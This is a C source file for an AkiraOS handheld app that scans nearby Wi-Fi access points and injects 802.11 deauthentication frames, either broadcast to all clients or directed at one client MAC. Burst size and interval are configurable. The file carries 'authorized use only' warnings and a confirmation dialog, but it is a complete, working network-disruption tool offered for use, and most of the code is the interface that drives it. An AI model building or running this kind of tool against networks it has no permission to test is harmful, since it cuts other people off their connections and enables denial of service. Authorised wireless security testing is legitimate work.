/*
 * wifi_deauth — 802.11 deauthentication frame injector for AkiraOS
 *
 * FOR AUTHORIZED USE ONLY — use only on networks you own or have
 * explicit written permission to test.
 *
 * Flow:
 *   SCAN → scan for APs → LIST → select AP →
 *   MODE → broadcast or directed (→ MAC_EDIT if directed) →
 *   CONFIG → burst size + interval →
 *   CONFIRM (2 s hold) → INJECT → DONE
 *
 * Controls (all screens):
 *   UP / DOWN  — navigate list / change value
 *   A          — confirm / advance
 *   B          — back / cancel / rescan (LIST screen)
 */

#include "akira_api.h"
#include "../../common/akira_ui.h"
#include <stdint.h>

/* ── Limits ─────────────────────────────────────────────────────────────── */

#define MAX_APS         32
#define HOLD_DURATION   2000u    /* ms hold required on CONFIRM screen */
#define BATCH_SIZE      10       /* frames sent per INJECT tick before UI update */

/* ── States ─────────────────────────────────────────────────────────────── */

#define STATE_SCAN      0
#define STATE_LIST      1
#define STATE_MODE      2    /* broadcast vs directed */
#define STATE_MAC_EDIT  3    /* enter target client MAC */
#define STATE_CONFIG    4    /* burst count + interval */
#define STATE_CONFIRM   5    /* 2 s hold safety */
#define STATE_INJECT    6
#define STATE_DONE      7

/* ── Display geometry ────────────────────────────────────────────────────── */

#define DW       320
#define DH       240
#define HDR_H    16
#define ROW_H    14
#define FOT_H    14
#define FOT_Y    (DH - FOT_H)

#define COL_BG   CONSOLE_COLOR_BG
#define COL_HDR  CONSOLE_COLOR_HEADER
#define COL_SEP  CONSOLE_COLOR_SEP
#define COL_TXT  CONSOLE_COLOR_TEXT
#define COL_DIM  CONSOLE_COLOR_DIM
#define COL_ACC  CONSOLE_COLOR_ACCENT
#define COL_OK   CONSOLE_COLOR_OK
#define COL_WARN CONSOLE_COLOR_WARN
#define COL_ERR  CONSOLE_COLOR_ERR
#define COL_SEL  CONSOLE_COLOR_SEL_BG

/* ── String helpers (no libc) ─────────────────────────────────────────── */

static int my_strlen(const char *s)
{
    int n = 0;
    while (s[n]) n++;
    return n;
}

static void my_itoa(int v, char *buf, int buflen)
{
    if (buflen < 2) return;
    if (v < 0) { buf[0] = '-'; v = -v; buf++; buflen--; }
    char tmp[12];
    int n = 0;
    if (v == 0) { tmp[n++] = '0'; }
    while (v > 0 && n < 11) { tmp[n++] = '0' + v % 10; v /= 10; }
    int out = n < buflen - 1 ? n : buflen - 1;
    for (int i = 0; i < out; i++) buf[i] = tmp[n - 1 - i];
    buf[out] = '\0';
}

/* Format a 6-byte MAC as "AA:BB:CC:DD:EE:FF" into buf (must be ≥18 bytes) */
static void fmt_mac(const uint8_t *mac, char *buf)
{
    static const char hex[] = "0123456789ABCDEF";
    for (int i = 0; i < 6; i++) {
        buf[i*3]   = hex[(mac[i] >> 4) & 0xF];
        buf[i*3+1] = hex[mac[i] & 0xF];
        buf[i*3+2] = (i < 5) ? ':' : '\0';
    }
    buf[17] = '\0';
}

/* Format RSSI as e.g. "-72" */
static void fmt_rssi(int8_t rssi, char *buf, int len)
{
    if (rssi == 0) { buf[0]='?'; buf[1]='\0'; return; }
    my_itoa((int)rssi, buf, len);
}

/* ── Globals ─────────────────────────────────────────────────────────────── */

static int   g_state = STATE_SCAN;
static int   g_needs_redraw = 1;

/* AP list */
static akira_wifi_ap_t g_aps[MAX_APS];
static int             g_ap_count;
static int             g_sel;
static int             g_scroll;
static char            g_scan_status[48];  /* "Scanning…" / "N APs found" */

/* Selected AP for injection */
static akira_wifi_ap_t g_target_ap;

/* Mode: 0 = broadcast, 1 = directed */
static int g_mode_sel;          /* cursor in MODE screen */

/* Client MAC (directed mode) */
static uint8_t g_client_mac[6];
static int     g_mac_nibble;    /* 0-11, which nibble is being edited */

/* Config */
static int g_config_field;      /* 0=count, 1=interval */

/* Burst count presets */
static const int COUNT_PRESETS[]    = { 1, 5, 10, 25, 50, 100, 250, 500, 1000 };
#define N_COUNT_PRESETS 9
static int g_count_idx = 2;     /* default: 10 frames */

/* Interval presets (ms) */
static const int INTERVAL_PRESETS[] = { 10, 25, 50, 100, 250, 500, 1000 };
#define N_INTERVAL_PRESETS 7
static int g_interval_idx = 3;  /* default: 100 ms */

/* Safety interlock */
static uint32_t g_hold_start;

/* Injection progress */
static int      g_frames_target;
static int      g_frames_sent;
static int      g_frames_total;  /* across all batches for continuous */
static int      g_inject_done;
static char     g_done_msg[48];

/* ── Helpers ─────────────────────────────────────────────────────────────── */

static void draw_hdr(const char *title)
{
    display_rect(0, 0, DW, HDR_H, COL_HDR);
    display_text(4, 3, title, COL_TXT);
}

static void draw_footer(const char *hint)
{
    display_rect(0, FOT_Y, DW, FOT_H, COL_HDR);
    display_text(4, FOT_Y + 2, hint, COL_DIM);
}

static void draw_bar(int y, int h, uint32_t done, uint32_t total, uint16_t col)
{
    int w = total > 0 ? (int)((uint32_t)(DW - 8) * done / total) : 0;
    display_rect(4, y, DW - 8, h, COL_SEP);
    if (w > 0) display_rect(4, y, w, h, col);
}

/* Security-type short label */
static const char *sec_label(uint8_t sec)
{
    switch (sec) {
    case WIFI_SEC_OPEN: return "OPEN";
    case WIFI_SEC_WEP:  return "WEP ";
    case WIFI_SEC_WPA:  return "WPA ";
    case WIFI_SEC_WPA2: return "WPA2";
    case WIFI_SEC_WPA3: return "WPA3";
    case WIFI_SEC_ENT:  return "ENT ";
    default:            return "?   ";
    }
}

/* ── Screen renderers ────────────────────────────────────────────────────── */

static void draw_scan(void)
{
    draw_hdr("WIFI DEAUTH — SCANNING");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);
    display_text(8, HDR_H + 16, g_scan_status[0] ? g_scan_status : "Scanning...", COL_DIM);
    draw_footer("Please wait...");
}

static void draw_list(void)
{
    draw_hdr("WIFI DEAUTH — SELECT AP");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);

    int rows = (DH - HDR_H - FOT_H) / ROW_H;

    if (g_ap_count == 0) {
        display_text(8, HDR_H + 12, "No APs found.", COL_DIM);
        display_text(8, HDR_H + 28, "[B] to rescan", COL_DIM);
    }

    for (int i = 0; i < rows && (i + g_scroll) < g_ap_count; i++) {
        int idx = i + g_scroll;
        const akira_wifi_ap_t *ap = &g_aps[idx];
        int y   = HDR_H + i * ROW_H;
        int sel = (idx == g_sel);
        display_rect(0, y, DW, ROW_H, sel ? COL_SEL : COL_BG);

        /* SSID (truncated to 20 chars) */
        char ssid[21];
        int slen = my_strlen((const char *)ap->ssid);
        if (slen > 20) slen = 20;
        for (int j = 0; j < slen; j++) ssid[j] = (char)ap->ssid[j];
        ssid[slen] = '\0';
        display_text(8, y + 3, ssid, sel ? COL_TXT : COL_DIM);

        /* ch + RSSI + security — right-aligned */
        char info[24];
        char rssi_s[6];
        fmt_rssi(ap->rssi, rssi_s, sizeof(rssi_s));
        char ch_s[4];
        my_itoa(ap->channel, ch_s, sizeof(ch_s));
        /* info = "ch6 -72dBm WPA2" */
        int ip = 0;
        info[ip++]='c'; info[ip++]='h';
        for (int j = 0; ch_s[j]; j++) info[ip++] = ch_s[j];
        info[ip++]=' ';
        for (int j = 0; rssi_s[j]; j++) info[ip++] = rssi_s[j];
        info[ip++]='d'; info[ip++]='B'; info[ip++]='m'; info[ip++]=' ';
        const char *sl = sec_label(ap->security);
        for (int j = 0; sl[j]; j++) info[ip++] = sl[j];
        info[ip] = '\0';
        display_text(DW - 112, y + 3, info, COL_DIM);
    }

    draw_footer("[A]Select [B]Rescan [UP/DN]Nav");
}

static void draw_mode(void)
{
    draw_hdr("WIFI DEAUTH — TARGET");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);

    int y = HDR_H + 6;
    char mac_s[18];
    fmt_mac(g_target_ap.bssid, mac_s);

    display_text(8, y, "AP:", COL_DIM); y += ROW_H;
    display_text(16, y, (const char *)g_target_ap.ssid, COL_ACC); y += ROW_H;
    display_text(8, y, mac_s, COL_DIM); y += ROW_H + 4;
    display_rect(0, y, DW, 1, COL_SEP); y += 6;

    display_text(8, y, "Target:", COL_DIM); y += ROW_H;

    /* Broadcast option */
    uint16_t c0 = (g_mode_sel == 0) ? COL_TXT : COL_DIM;
    display_rect(4, y, DW - 8, ROW_H, (g_mode_sel == 0) ? COL_SEL : COL_BG);
    display_text(12, y + 3, "Broadcast (all clients)", c0); y += ROW_H;

    /* Directed option */
    uint16_t c1 = (g_mode_sel == 1) ? COL_TXT : COL_DIM;
    display_rect(4, y, DW - 8, ROW_H, (g_mode_sel == 1) ? COL_SEL : COL_BG);
    display_text(12, y + 3, "Directed (enter MAC)", c1);

    draw_footer("[A]Select [B]Back [UP/DN]Nav");
}

static void draw_mac_edit(void)
{
    draw_hdr("WIFI DEAUTH — CLIENT MAC");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);

    int y = HDR_H + 16;
    display_text(8, y, "Enter target client MAC:", COL_DIM);
    y += ROW_H + 4;

    /* Render MAC nibble-by-nibble, highlight active nibble */
    static const char hex[] = "0123456789ABCDEF";
    char buf[36];
    int  pos = 0;
    for (int b = 0; b < 6; b++) {
        int hi_nib = (g_mac_nibble == b * 2);
        int lo_nib = (g_mac_nibble == b * 2 + 1);

        /* High nibble */
        if (hi_nib) {
            buf[pos++] = '[';
            buf[pos++] = hex[(g_client_mac[b] >> 4) & 0xF];
            buf[pos++] = ']';
        } else {
            buf[pos++] = hex[(g_client_mac[b] >> 4) & 0xF];
        }
        /* Low nibble */
        if (lo_nib) {
            buf[pos++] = '[';
            buf[pos++] = hex[g_client_mac[b] & 0xF];
            buf[pos++] = ']';
        } else {
            buf[pos++] = hex[g_client_mac[b] & 0xF];
        }
        if (b < 5) buf[pos++] = ':';
    }
    buf[pos] = '\0';
    display_text(8, y, buf, COL_ACC);
    y += ROW_H + 8;

    display_text(8, y, "[UP/DN] change nibble  [A] next", COL_DIM);
    y += ROW_H;
    display_text(8, y, "[B] prev nibble / back", COL_DIM);

    draw_footer("[A]Next nibble [B]Back [UP/DN]Value");
}

static const char *count_str(void)
{
    static char buf[8];
    my_itoa(COUNT_PRESETS[g_count_idx], buf, sizeof(buf));
    return buf;
}

static const char *interval_str(void)
{
    static char buf[8];
    my_itoa(INTERVAL_PRESETS[g_interval_idx], buf, sizeof(buf));
    return buf;
}

static void draw_config(void)
{
    draw_hdr("WIFI DEAUTH — CONFIG");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);

    int y = HDR_H + 8;

    /* Show target summary */
    char mac_s[18];
    if (g_mode_sel == 0) {
        for (int i = 0; i < 17; i++) mac_s[i] = "FF:FF:FF:FF:FF:FF"[i];
        mac_s[17] = '\0';
    } else {
        fmt_mac(g_client_mac, mac_s);
    }
    display_text(8, y, "AP:", COL_DIM);
    display_text(28, y, (const char *)g_target_ap.ssid, COL_ACC);
    y += ROW_H;
    display_text(8, y, "To:", COL_DIM);
    display_text(28, y, mac_s, COL_DIM);
    y += ROW_H + 4;
    display_rect(0, y, DW, 1, COL_SEP);
    y += 6;

    /* Count field */
    int sel0 = (g_config_field == 0);
    display_rect(4, y, DW - 8, ROW_H, sel0 ? COL_SEL : COL_BG);
    display_text(12, y + 3, "Frames:", sel0 ? COL_TXT : COL_DIM);
    display_text(80, y + 3, count_str(), sel0 ? COL_ACC : COL_DIM);
    y += ROW_H;

    /* Interval field */
    int sel1 = (g_config_field == 1);
    display_rect(4, y, DW - 8, ROW_H, sel1 ? COL_SEL : COL_BG);
    display_text(12, y + 3, "Interval:", sel1 ? COL_TXT : COL_DIM);
    char intv[14];
    int ip = 0;
    const char *iv = interval_str();
    while (*iv) intv[ip++] = *iv++;
    intv[ip++]=' '; intv[ip++]='m'; intv[ip++]='s'; intv[ip]='\0';
    display_text(80, y + 3, intv, sel1 ? COL_ACC : COL_DIM);
    y += ROW_H + 4;

    /* Estimated time */
    int est_ms = COUNT_PRESETS[g_count_idx] * INTERVAL_PRESETS[g_interval_idx];
    char est[24];
    int ep = 0;
    est[ep++]='~'; est[ep++]=' ';
    char sec_s[8];
    my_itoa(est_ms / 1000, sec_s, sizeof(sec_s));
    for (int j = 0; sec_s[j]; j++) est[ep++] = sec_s[j];
    est[ep++]='.';
    char ms_s[4];
    my_itoa((est_ms % 1000) / 100, ms_s, sizeof(ms_s));
    est[ep++] = ms_s[0];
    est[ep++]='s'; est[ep]='\0';
    display_text(8, y, est, COL_DIM);

    draw_footer("[UP/DN]Value [LEFT/RIGHT]Field [A]Next");
}

static void draw_confirm(void)
{
    draw_hdr("WIFI DEAUTH — CONFIRM");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);

    int y = HDR_H + 8;

    char mac_s[18];
    if (g_mode_sel == 0) {
        for (int i = 0; i < 17; i++) mac_s[i] = "FF:FF:FF:FF:FF:FF"[i];
        mac_s[17] = '\0';
    } else {
        fmt_mac(g_client_mac, mac_s);
    }

    display_text(8, y, "AP:", COL_DIM);
    display_text(28, y, (const char *)g_target_ap.ssid, COL_WARN);
    y += ROW_H;
    display_text(8, y, "BSSID:", COL_DIM);
    char bssid_s[18]; fmt_mac(g_target_ap.bssid, bssid_s);
    display_text(52, y, bssid_s, COL_DIM);
    y += ROW_H;
    display_text(8, y, "Target:", COL_DIM);
    display_text(60, y, mac_s, COL_DIM);
    y += ROW_H;

    char count_info[24];
    int cip = 0;
    const char *cs = count_str();
    while (*cs) count_info[cip++] = *cs++;
    count_info[cip++]=' '; count_info[cip++]='f'; count_info[cip++]='r';
    count_info[cip++]='a'; count_info[cip++]='m'; count_info[cip++]='e';
    count_info[cip++]='s'; count_info[cip++]=' '; count_info[cip++]='@';
    count_info[cip++]=' ';
    const char *iv = interval_str();
    while (*iv) count_info[cip++] = *iv++;
    count_info[cip++]='m'; count_info[cip++]='s'; count_info[cip] = '\0';
    display_text(8, y, count_info, COL_DIM);
    y += ROW_H + 4;

    display_rect(0, y, DW, 1, COL_SEP);
    y += 6;
    display_text(8, y, "AUTHORIZED USE ONLY", COL_WARN);
    y += ROW_H;
    display_text(8, y, "Hold [A] 2s to inject", COL_WARN);
    y += ROW_H + 6;

    uint32_t now  = (uint32_t)rtc_get_uptime_ms();
    uint32_t held = (g_hold_start && now > g_hold_start) ? now - g_hold_start : 0;
    if (held > HOLD_DURATION) held = HOLD_DURATION;
    draw_bar(y, 10, held, HOLD_DURATION, COL_WARN);

    draw_footer("[A]Hold to confirm [B]Cancel");
}

static void draw_inject(void)
{
    draw_hdr("WIFI DEAUTH — INJECTING");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);

    int y = HDR_H + 10;

    char sent_s[10]; my_itoa(g_frames_total, sent_s, sizeof(sent_s));
    char tgt_s[10];  my_itoa(g_frames_target, tgt_s, sizeof(tgt_s));

    char prog[28];
    int pp = 0;
    for (int j = 0; sent_s[j]; j++) prog[pp++] = sent_s[j];
    prog[pp++]=' '; prog[pp++]='/'; prog[pp++]=' ';
    for (int j = 0; tgt_s[j]; j++) prog[pp++] = tgt_s[j];
    prog[pp++]=' '; prog[pp++]='f'; prog[pp++]='r'; prog[pp++]='a';
    prog[pp++]='m'; prog[pp++]='e'; prog[pp++]='s'; prog[pp] = '\0';

    display_text(8, y, prog, COL_TXT);
    y += ROW_H + 4;

    display_text(8, y, (const char *)g_target_ap.ssid, COL_DIM);
    y += ROW_H + 4;

    display_rect(0, y, DW, 1, COL_SEP);
    y += 6;
    display_text(8, y, "DO NOT LEAVE AREA", COL_WARN);
    y += ROW_H + 8;

    draw_bar(y, 12, (uint32_t)g_frames_total, (uint32_t)g_frames_target, COL_WARN);

    draw_footer("[B]Abort");
}

static void draw_done(void)
{
    draw_hdr("WIFI DEAUTH — DONE");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);

    int y = HDR_H + 20;
    display_text(8, y, g_done_msg[0] ? g_done_msg : "Done.", COL_OK);
    y += ROW_H + 4;
    display_text(8, y, (const char *)g_target_ap.ssid, COL_DIM);
    y += ROW_H + 8;
    draw_bar(y, 8, 1, 1, COL_OK);

    draw_footer("[A/B]Back to list");
}

/* ── Scan ────────────────────────────────────────────────────────────────── */

static void do_scan(void)
{
    g_scan_status[0] = 'S'; g_scan_status[1] = 'c'; g_scan_status[2] = 'a';
    g_scan_status[3] = 'n'; g_scan_status[4] = 'n'; g_scan_status[5] = 'i';
    g_scan_status[6] = 'n'; g_scan_status[7] = 'g'; g_scan_status[8] = '.';
    g_scan_status[9] = '.'; g_scan_status[10] = '.'; g_scan_status[11] = '\0';
    g_needs_redraw = 1;
    draw_scan();
    display_flush();

    int n = wifi_scan_aps(g_aps, sizeof(g_aps));
    g_ap_count = (n > 0) ? (n < MAX_APS ? n : MAX_APS) : 0;
    g_sel      = 0;
    g_scroll   = 0;

    if (g_ap_count == 0) {
        g_scan_status[0]='N'; g_scan_status[1]='o'; g_scan_status[2]=' ';
        g_scan_status[3]='A'; g_scan_status[4]='P'; g_scan_status[5]='s';
        g_scan_status[6]='.'; g_scan_status[7]='\0';
    } else {
        char num[4]; my_itoa(g_ap_count, num, sizeof(num));
        int sp = 0;
        for (int j = 0; num[j]; j++) g_scan_status[sp++] = num[j];
        const char *suf = " APs found";
        for (int j = 0; suf[j]; j++) g_scan_status[sp++] = suf[j];
        g_scan_status[sp] = '\0';
    }

    g_state = STATE_LIST;
    g_needs_redraw = 1;
}

/* ── Entry point ──────────────────────────────────────────────────────────── */

int main(void)
{
    int prev_btns = 0;

    /* Default client MAC = broadcast */
    for (int i = 0; i < 6; i++) g_client_mac[i] = 0xFF;
    g_mac_nibble = 0;

    while (1) {
        /* Kick off scan on entry to SCAN state */
        if (g_state == STATE_SCAN) {
            do_scan();
            /* do_scan() is blocking — returns with g_state == STATE_LIST */
        }

        /* ── Injection tick ── */
        if (g_state == STATE_INJECT && !g_inject_done) {
            int remaining = g_frames_target - g_frames_total;
            if (remaining <= 0) {
                g_inject_done = 1;
            } else {
                int batch = remaining < BATCH_SIZE ? remaining : BATCH_SIZE;
                const uint8_t *client = (g_mode_sel == 0)
                                        ? WIFI_MAC_BROADCAST
                                        : g_client_mac;
                int sent = wifi_deauth(g_target_ap.bssid, client,
                                       (int32_t)g_target_ap.channel,
                                       batch,
                                       (int32_t)INTERVAL_PRESETS[g_interval_idx]);
                if (sent > 0) g_frames_total += sent;
                else          g_frames_total += batch; /* count even on partial error */

                if (g_frames_total >= g_frames_target) g_inject_done = 1;
            }

            if (g_inject_done) {
                /* Build done message */
                char num[8]; my_itoa(g_frames_total, num, sizeof(num));
                int dp = 0;
                for (int j = 0; num[j]; j++) g_done_msg[dp++] = num[j];
                const char *sfx = " frames sent";
                for (int j = 0; sfx[j]; j++) g_done_msg[dp++] = sfx[j];
                g_done_msg[dp] = '\0';
                g_state = STATE_DONE;
            }
            g_needs_redraw = 1;
        }

        /* ── Input ── */
        int btns    = input_get_buttons();
        int pressed = btns & ~prev_btns;
        prev_btns   = btns;

        if (pressed) g_needs_redraw = 1;

        int rows = (DH - HDR_H - FOT_H) / ROW_H;

        switch (g_state) {

        case STATE_LIST:
            if (pressed & AKIRA_BTN_UP) {
                if (g_sel > 0) { g_sel--; if (g_sel < g_scroll) g_scroll = g_sel; }
            }
            if (pressed & AKIRA_BTN_DOWN) {
                if (g_sel < g_ap_count - 1) {
                    g_sel++;
                    if (g_sel >= g_scroll + rows) g_scroll = g_sel - rows + 1;
                }
            }
            if (pressed & AKIRA_BTN_B) {
                g_state = STATE_SCAN;  /* rescan */
            }
            if ((pressed & AKIRA_BTN_A) && g_ap_count > 0) {
                g_target_ap  = g_aps[g_sel];
                g_mode_sel   = 0;
                g_state      = STATE_MODE;
            }
            break;

        case STATE_MODE:
            if (pressed & AKIRA_BTN_UP)   g_mode_sel = 0;
            if (pressed & AKIRA_BTN_DOWN)  g_mode_sel = 1;
            if (pressed & AKIRA_BTN_B)     g_state = STATE_LIST;
            if (pressed & AKIRA_BTN_A) {
                if (g_mode_sel == 1) {
                    /* Reset MAC to broadcast as starting point */
                    for (int i = 0; i < 6; i++) g_client_mac[i] = 0x00;
                    g_mac_nibble = 0;
                    g_state = STATE_MAC_EDIT;
                } else {
                    g_config_field = 0;
                    g_state = STATE_CONFIG;
                }
            }
            break;

        case STATE_MAC_EDIT: {
            static const char hex[] = "0123456789ABCDEF";
            int byte  = g_mac_nibble / 2;
            int hi    = (g_mac_nibble % 2 == 0);
            uint8_t cur = g_client_mac[byte];
            int nib = hi ? ((cur >> 4) & 0xF) : (cur & 0xF);

            if (pressed & AKIRA_BTN_UP)   nib = (nib + 1) & 0xF;
            if (pressed & AKIRA_BTN_DOWN)  nib = (nib - 1 + 16) & 0xF;
            (void)hex;

            if (hi) g_client_mac[byte] = (uint8_t)((nib << 4) | (cur & 0x0F));
            else    g_client_mac[byte] = (uint8_t)((cur & 0xF0) | nib);

            if (pressed & AKIRA_BTN_A) {
                if (g_mac_nibble < 11) {
                    g_mac_nibble++;
                } else {
                    /* Done — move to config */
                    g_config_field = 0;
                    g_state = STATE_CONFIG;
                }
            }
            if (pressed & AKIRA_BTN_B) {
                if (g_mac_nibble > 0) g_mac_nibble--;
                else                  g_state = STATE_MODE;
            }
            break;
        }

        case STATE_CONFIG:
            if (pressed & AKIRA_BTN_LEFT)  { g_config_field = 0; }
            if (pressed & AKIRA_BTN_RIGHT)  { g_config_field = 1; }
            if (g_config_field == 0) {
                if (pressed & AKIRA_BTN_UP)   { if (g_count_idx < N_COUNT_PRESETS - 1) g_count_idx++; }
                if (pressed & AKIRA_BTN_DOWN)  { if (g_count_idx > 0)                   g_count_idx--; }
            } else {
                if (pressed & AKIRA_BTN_UP)   { if (g_interval_idx < N_INTERVAL_PRESETS - 1) g_interval_idx++; }
                if (pressed & AKIRA_BTN_DOWN)  { if (g_interval_idx > 0)                       g_interval_idx--; }
            }
            if (pressed & AKIRA_BTN_B)     { g_state = (g_mode_sel == 1) ? STATE_MAC_EDIT : STATE_MODE; }
            if (pressed & AKIRA_BTN_A)     { g_hold_start = 0; g_state = STATE_CONFIRM; }
            break;

        case STATE_CONFIRM: {
            /* wifi_deauth() is a restricted syscall — gate it through the
             * shared 3px Capability-Guard dialog (blocking). */
            bool ok = akira_ui_confirm_dialog("WIFI_DEAUTH",
                                              "inject deauth frames?");
            if (ok) {
                /* Arm injection */
                g_frames_target = COUNT_PRESETS[g_count_idx];
                g_frames_total  = 0;
                g_frames_sent   = 0;
                g_inject_done   = 0;
                g_done_msg[0]   = '\0';
                g_hold_start    = 0;
                g_state         = STATE_INJECT;
            } else {
                g_hold_start = 0;
                g_state      = STATE_CONFIG;
            }
            prev_btns = input_get_buttons(); /* swallow buttons held in dialog */
            g_needs_redraw = 1;
            break;
        }

        case STATE_INJECT:
            if ((pressed & AKIRA_BTN_B) && !g_inject_done) {
                /* Abort */
                char num[8]; my_itoa(g_frames_total, num, sizeof(num));
                int dp = 0;
                for (int j = 0; num[j]; j++) g_done_msg[dp++] = num[j];
                const char *sfx = " sent (aborted)";
                for (int j = 0; sfx[j]; j++) g_done_msg[dp++] = sfx[j];
                g_done_msg[dp] = '\0';
                g_inject_done = 1;
                g_state = STATE_DONE;
            }
            break;

        case STATE_DONE:
            if (pressed & (AKIRA_BTN_A | AKIRA_BTN_B)) {
                g_state = STATE_LIST;
            }
            break;

        default:
            break;
        }

        /* ── Redraw ── */
        if (g_needs_redraw) {
            switch (g_state) {
            case STATE_SCAN:     draw_scan();     break;
            case STATE_LIST:     draw_list();     break;
            case STATE_MODE:     draw_mode();     break;
            case STATE_MAC_EDIT: draw_mac_edit(); break;
            case STATE_CONFIG:   draw_config();   break;
            case STATE_CONFIRM:  draw_confirm();  break;
            case STATE_INJECT:   draw_inject();   break;
            case STATE_DONE:     draw_done();     break;
            default: break;
            }
            display_flush();
            g_needs_redraw = 0;
        }

        /* Force redraw during confirm (progress bar) and inject (progress) */
        if (g_state == STATE_CONFIRM || g_state == STATE_INJECT) {
            g_needs_redraw = 1;
        }

        delay(20);
    }

    return 0;
}
